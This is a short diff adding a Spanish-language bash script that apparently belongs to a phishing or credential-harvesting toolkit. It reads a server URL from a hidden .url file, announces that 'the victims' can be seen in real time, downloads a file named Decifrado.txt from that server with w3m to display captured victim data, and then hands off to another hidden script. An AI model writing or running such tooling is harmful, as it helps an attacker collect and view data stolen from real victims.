@@ -1,0 +1,9 @@
+url=$(cat .url)
+bash .banner
+echo "Aqui se ven en tiempo real las victimas:"
+echo ""
+w3m -dump $url/Decifrado.txt
+echo ""
+echo "Presiona una tecla para continuar..."
+read pause
+bash .terminal
